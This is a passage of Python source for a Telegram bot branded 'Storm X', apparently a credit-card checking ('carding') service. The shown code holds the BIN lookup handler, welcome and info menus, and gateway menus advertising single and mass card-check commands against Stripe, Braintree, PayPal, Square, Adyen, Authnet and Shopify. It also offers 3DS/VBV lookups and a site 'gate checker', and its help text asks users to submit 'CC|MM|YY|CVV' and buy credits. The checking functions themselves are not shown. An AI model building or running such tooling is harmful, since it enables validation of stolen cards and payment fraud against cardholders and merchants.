    for char in input_text:
        if char.isdigit():
            bin_number += char
            if len(bin_number) >= 8:
                break
        elif char == '|':
            break

    if len(bin_number) < 6:
        bot.reply_to(message, "Please provide a valid BIN with at least 6 digits. Example: /bin 524534 or .bin 52453444|02|2026")
        return

    bin_number = bin_number[:8]
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

    processing_msg = f"<a href='https://t.me/stormxvup'>🔍 Checking BIN: {bin_number}</a>"
    status_message = bot.reply_to(message, processing_msg, parse_mode='HTML')

    start_time = time.time()
    bin_info = get_bin_info(bin_number) or {}
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = format_bin_result(bin_info, bin_number, mention, user_status, time_taken)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

@bot.message_handler(commands=['start'])
def handle_start(message):
    save_user(message.from_user.id, message.from_user.username)

    # Get user information
    user = message.from_user
    mention = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    username = f"@{user.username}" if user.username else "None"
    join_date = message.date  # This is a timestamp, convert to readable format
    join_date_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(join_date))

    # Get user credits
    users = load_users()
    credits = users.get(str(user.id), {}).get("credits", 0)

    # Create the caption with formatting
    caption = f"""↯ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴛᴏʀᴍ x

<a href='https://t.me/stormxvup'>[⸙]</a> ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
<a href='https://t.me/stormxvup'>[⸙]</a> ᴊᴏɪɴ ᴅᴀᴛᴇ ⌁ {join_date_formatted}
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʜᴀᴛ ɪᴅ ⌁ <code>{user.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʀᴇᴅɪᴛs ⌁ {credits}

↯ ᴜsᴇ ᴛʜᴇ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ"""

    # Create inline keyboard buttons - 2 buttons per line
    markup = telebot.types.InlineKeyboardMarkup()

    # Row 1
    btn1 = telebot.types.InlineKeyboardButton("🔍 Gateways", callback_data="gateways")
    btn2 = telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")

    # Row 2
    btn3 = telebot.types.InlineKeyboardButton("❓ Help", callback_data="help")
    btn4 = telebot.types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")

    # Row 3
    btn5 = telebot.types.InlineKeyboardButton("📢 Channel", url="https://t.me/stormxvup")

    # Add buttons to markup
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5)

    # First try to send the video
    try:
        msg = bot.send_video(
            chat_id=message.chat.id,
            video="https://t.me/video336/2",
            caption=caption,
            parse_mode='HTML',
            reply_markup=markup,
            timeout=10  # Add timeout to prevent hanging
        )
        print("Video sent successfully")

    except Exception as e:
        print(f"Video failed: {e}")
        # If video fails, try sending as document
        try:
            msg = bot.send_document(
                chat_id=message.chat.id,
                document="https://t.me/video336/2",
                caption=caption,
                parse_mode='HTML',
                reply_markup=markup,
                timeout=10
            )
            print("Sent as document")

        except Exception as e2:
            print(f"Document also failed: {e2}")
            # If both fail, send text message with thumbnail
            try:
                # Try to send with a photo first
                msg = bot.send_photo(
                    chat_id=message.chat.id,
                    photo="https://img.icons8.com/fluency/96/000000/telegram-app.png",
                    caption=caption,
                    parse_mode='HTML',
                    reply_markup=markup,
                    timeout=10
                )
                print("Sent with photo")

            except Exception as e3:
                print(f"Photo failed: {e3}")
                # Final fallback: plain text message
                msg = bot.send_message(
                    chat_id=message.chat.id,
                    text=caption,
                    parse_mode='HTML',
                    reply_markup=markup,
                    disable_web_page_preview=True
                )
                print("Sent plain text message")

    # Store message ID for callback handling
    if not hasattr(bot, 'user_data'):
        bot.user_data = {}
    bot.user_data[message.chat.id] = {"welcome_msg_id": msg.message_id}

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user = call.from_user
    mention = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    username = f"@{user.username}" if user.username else "None"
    
    # Get user credits
    users = load_users()
    credits = users.get(str(user.id), {}).get("credits", 0)

    if call.data == "gateways":
        # Show gateway selection menu
        gateways_text = f"""🔍 <b>Select Gateway Below:</b>
Choose a payment gateway to check your cards"""

        # Create gateway selection buttons (2 buttons per row)
        markup = telebot.types.InlineKeyboardMarkup()

        # Rows with 2 buttons each
        btn1 = telebot.types.InlineKeyboardButton("Stripe", callback_data="gateway_stripe")
        btn2 = telebot.types.InlineKeyboardButton("Braintree", callback_data="gateway_braintree")
        markup.row(btn1, btn2)

        btn3 = telebot.types.InlineKeyboardButton("3DS Lookup", callback_data="gateway_3ds")
        btn4 = telebot.types.InlineKeyboardButton("Square", callback_data="gateway_square")
        markup.row(btn3, btn4)

        btn5 = telebot.types.InlineKeyboardButton("Paypal", callback_data="gateway_paypal")
        btn6 = telebot.types.InlineKeyboardButton("Site Based", callback_data="gateway_site")
        markup.row(btn5, btn6)

        btn7 = telebot.types.InlineKeyboardButton("Authnet", callback_data="gateway_authnet")
        btn8 = telebot.types.InlineKeyboardButton("Adyen", callback_data="gateway_adyen")
        markup.row(btn7, btn8)

        btn9 = telebot.types.InlineKeyboardButton("Auto Shopify", callback_data="gateway_shopify")
        markup.row(btn9)

        # Back button
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=gateways_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Select a gateway")

    elif call.data == "gateway_stripe":
        # Show Stripe gateway information
        stripe_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Stripe Auth</i>
[⸙] 𝐂𝐌𝐃: /chk [Single]
[⸙] 𝐂𝐌𝐃: /mchk [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅
──────── ⸙ ─────────
[⸙] 𝐍𝐀𝐌𝐄: <i>Stripe Auth 2</i>
[⸙] 𝐂𝐌𝐃: /au [Single]
[⸙] 𝐂𝐌𝐃: /mass [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅
──────── ⸙ ─────────
[⸙] 𝐍𝐀𝐌𝐄: <i>Stripe Auth 3</i>
[⸙] 𝐂𝐌𝐃: /sr [Single]
[⸙] 𝐂𝐌𝐃: /msr [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅
──────── ⸙ ─────────
[⸙] 𝐍𝐀𝐌𝐄: <i>Stripe Premium Auth</i>
[⸙] 𝐂𝐌𝐃: /sp [Single]
[⸙] 𝐂𝐌𝐃: /msp [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=stripe_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Stripe gateway information")

    elif call.data == "gateway_braintree":
        # Show Braintree gateway information
        braintree_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Braintree Auth</i>
[⸙] 𝐂𝐌𝐃: /b3 [Single]
[⸙] 𝐂𝐌𝐃: /mb3 [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅
──────── ⸙ ─────────
[⸙] 𝐍𝐀𝐌𝐄: <i>Braintree Charge</i>
[⸙] 𝐂𝐌𝐃: /br [Single]
[⸙] 𝐂𝐌𝐃: /mbr [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=braintree_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Braintree gateway information")

    elif call.data == "gateway_3ds":
        # Show 3DS Lookup gateway information
        three_ds_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>3DS Lookup</i>
[⸙] 𝐂𝐌𝐃: /vbv [Single]
[⸙] 𝐂𝐌𝐃: /mvbv [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=three_ds_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "3DS Lookup gateway information")

    elif call.data == "gateway_square":
        # Show Square gateway information
        square_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Square Charge</i>
[⸙] 𝐂𝐌𝐃: /qq [Single]
[⸙] 𝐂𝐌𝐃: /mqq [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=square_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Square gateway information")

    elif call.data == "gateway_paypal":
        # Show Paypal gateway information
        paypal_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Paypal Charge</i>
[⸙] 𝐂𝐌𝐃: /py [Single]
[⸙] 𝐂𝐌𝐃: /mpy [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=paypal_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Paypal gateway information")

    elif call.data == "gateway_site":
        # Show Site Based gateway information
        site_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Site Based Charge</i>
[⸙] 𝐂𝐌𝐃: /cc [Single]
[⸙] 𝐂𝐌𝐃: /mcc [Mass]
[⸙] 𝐒𝐭𝐨𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=site_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Site Based gateway information")

    elif call.data == "gateway_authnet":
        # Show Authnet gateway information
        authnet_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Authnet Charge</i>
[⸙] 𝐂𝐌𝐃: /at [Single]
[⸙] 𝐂𝐌𝐃: /mat [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=authnet_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Authnet gateway information")

    elif call.data == "gateway_adyen":
        # Show Adyen gateway information
        adyen_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Adyen Charge</i>
[⸙] 𝐂𝐌𝐃: /ad [Single]
[⸙] 𝐂𝐌𝐃: /mad [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=adyen_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Adyen gateway information")

    elif call.data == "gateway_shopify":
        # Show Auto Shopify gateway information
        shopify_text = f"""[⸙] 𝐍𝐀𝐌𝐄: <i>Auto Shopify Charge</i>
[⸙] 𝐂𝐌𝐃: /sh [Single]
[⸙] 𝐂𝐌𝐃: /msh [Mass]
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬: Active ✅"""

        # Create back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="gateways")
        markup.row(btn_back)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=shopify_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Auto Shopify gateway information")

    elif call.data == "tools":
        # Edit caption to show tools information
        tools_text = f"""🛠️ <b>Available Tools:</b>

<a href='https://t.me/stormxvup'>[⸙]</a> <code>.gate</code> URL - Gate Checker
• Check payment gateways, captcha, and security
<a href='https://t.me/stormxvup'>[⸙]</a> <code>.bin</code> BIN - BIN Lookup
• Get detailed BIN information
<a href='https://t.me/stormxvup'>[⸙]</a> <code>.au</code> - Stripe Auth 2
<a href='https://t.me/stormxvup'>[⸙]</a> <code>.at</code> - Authnet [5$]

ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ"""

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=tools_text,
                parse_mode='HTML',
                reply_markup=call.message.reply_markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Tools information displayed")

    elif call.data == "help":
        # Edit caption to show help information
        help_text = f"""❓ <b>Help & Support</b>
<a href='https://t.me/stormxvup'>[⸙]</a> <b>How to use:</b>
• Use commands like <code>.chk CC|MM|YY|CVV</code>
• For mass check, reply to message with cards using <code>.mchk</code>
<a href='https://t.me/stormxvup'>[⸙]</a> <b>Support:</b>
• Channel: @stormxvup
• Contact for help and credits
<a href='https://t.me/stormxvup'>[⸙]</a> <b>Note:</b>
• Always use valid card formats
• Results may vary by gateway
ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ"""

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=help_text,
                parse_mode='HTML',
                reply_markup=call.message.reply_markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Help information displayed")

    elif call.data == "myinfo":
        # Edit caption to show user info
        myinfo_text = f"""👤 <b>Your Information:</b>

<a href='https://t.me/stormxvup'>[⸙]</a> ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
<a href='https://t.me/stormxvup'>[⸙]</a> ᴜsᴇʀ ɪᴅ ⌁ <code>{user.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʀᴇᴅɪᴛs ⌁ {credits}

ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ"""

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=myinfo_text,
                parse_mode='HTML',
                reply_markup=call.message.reply_markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Your information displayed")

    elif call.data == "back_to_main":
        # Return to main welcome screen
        join_date_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(call.message.date))
        main_text = f"""↯ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴛᴏʀᴍ x<a href='https://t.me/stormxvup'>[⸙]</a>

<a href='https://t.me/stormxvup'>[⸙]</a> ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
<a href='https://t.me/stormxvup'>[⸙]</a>ᴊᴏɪɴ ᴅᴀᴛᴇ ⌁ {join_date_formatted}
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʜᴀᴛ ɪᴅ ⌁ <code>{user.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʀᴇᴅɪᴛs ⌁ {credits}

↯ ᴜsᴇ ᴛʜᴇ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ"""

        # Create the original main menu buttons
        markup = telebot.types.InlineKeyboardMarkup()

        # Row 1
        btn1 = telebot.types.InlineKeyboardButton("🔍 Gateways", callback_data="gateways")
        btn2 = telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")

        # Row 2
        btn3 = telebot.types.InlineKeyboardButton("❓ Help", callback_data="help")
        btn4 = telebot.types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")

        # Row 3
        btn5 = telebot.types.InlineKeyboardButton("📢 Channel", url="https://t.me/stormxvup")

        # Add buttons to markup
        markup.row(btn1, btn2)
        markup.row(btn3, btn4)
        markup.row(btn5)

        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=main_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except:
            pass
        bot.answer_callback_query(call.id, "Returned to main menu")

# Handle /info command
@bot.message_handler(commands=['info'])
def handle_info(message):
    try:
        user = message.from_user
        chat = message.chat
        
        # Get user info
        mention = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
        username = f"@{user.username}" if user.username else "None"
        user_id = user.id
        chat_id = chat.id
        
        # Calculate member since date
        join_date = message.date
        join_date_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(join_date))
        
        # Get user status
        status = get_user_status(user_id)
        
        # Get user credits
        users = load_users()
        credits = users.get(str(user_id), {}).get("credits", 0)
        
        info_text = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> ɴᴀᴍᴇ ➳ {mention}
<a href='https://t.me/stormxvup'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ➳ <i>{username}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴜsᴇʀ ɪᴅ ➳ <code>{user_id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʜᴀᴛ ɪᴅ ➳ <code>{chat_id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> ᴍᴇᴍʙᴇʀ sɪɴᴄᴇ ➳ {join_date_formatted}

<a href='https://t.me/stormxvup'>[⸙]</a> sᴛᴀᴛᴜs ➳ [ {status} ]
<a href='https://t.me/stormxvup'>[⸙]</a> ᴄʀᴇᴅɪᴛs ➳ {credits}

<a href='https://t.me/stormxvup'>[⸙]</a> ʙᴏᴛ ʙʏ ➳ <a href='https://t.me/stormxvup'>⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲</a>
"""
        
        bot.reply_to(message, info_text, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle /id command
@bot.message_handler(commands=['id'])
def handle_id(message):
    try:
        user = message.from_user
        chat = message.chat
        
        # Check if it's a group chat
        if chat.type in ['group', 'supergroup']:
            response = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐂𝐡𝐚𝐭 𝐈𝐧𝐟𝐨</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐔𝐬𝐞𝐫 𝐈𝐃 ➳ <code>{user.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐡𝐚𝐭 𝐈𝐃 ➳ <code>{chat.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐡𝐚𝐭 𝐓𝐲𝐩𝐞 ➳ {chat.type.capitalize()}
"""
            
            if chat.title:
                response += f"<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐡𝐚𝐭 𝐍𝐚𝐦𝐞 ➳ {chat.title}\n"
                
        else:
            # Private chat
            response = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐔𝐬𝐞𝐫 𝐈𝐃 ➳ <code>{user.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐡𝐚𝐭 𝐈𝐃 ➳ <code>{chat.id}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐡𝐚𝐭 𝐓𝐲𝐩𝐞 ➳ Private
"""
        
        response += f"\n<a href='https://t.me/stormxvup'>[⸙]</a> ʙᴏᴛ ʙʏ ➳ <a href='https://t.me/stormxvup'>⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲</a>"
        
        bot.reply_to(message, response, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Run the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
